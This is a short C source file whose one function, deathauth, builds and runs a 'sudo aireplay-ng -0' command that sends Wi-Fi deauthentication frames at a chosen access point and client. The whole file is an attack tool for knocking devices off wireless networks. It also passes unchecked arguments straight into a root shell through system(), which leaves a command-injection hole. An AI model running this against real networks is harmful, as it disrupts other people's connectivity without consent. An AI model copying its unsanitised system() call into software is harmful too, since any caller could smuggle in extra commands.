#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "deathauth.h"


int deathauth (char *numberDeauths, char *acessPoint, char *client, char *wirlessCard){
    // Declare a buffer to hold the command string.
    char commande[100];

    // Constructs the command to perform deauthentication attack on the specified client.
    snprintf(commande, sizeof(commande), "sudo aireplay-ng -0 %s -a %s -c %s %s", numberDeauths, acessPoint, client, wirlessCard);

    // Executes the command.
    system(commande);

    return 0;
}
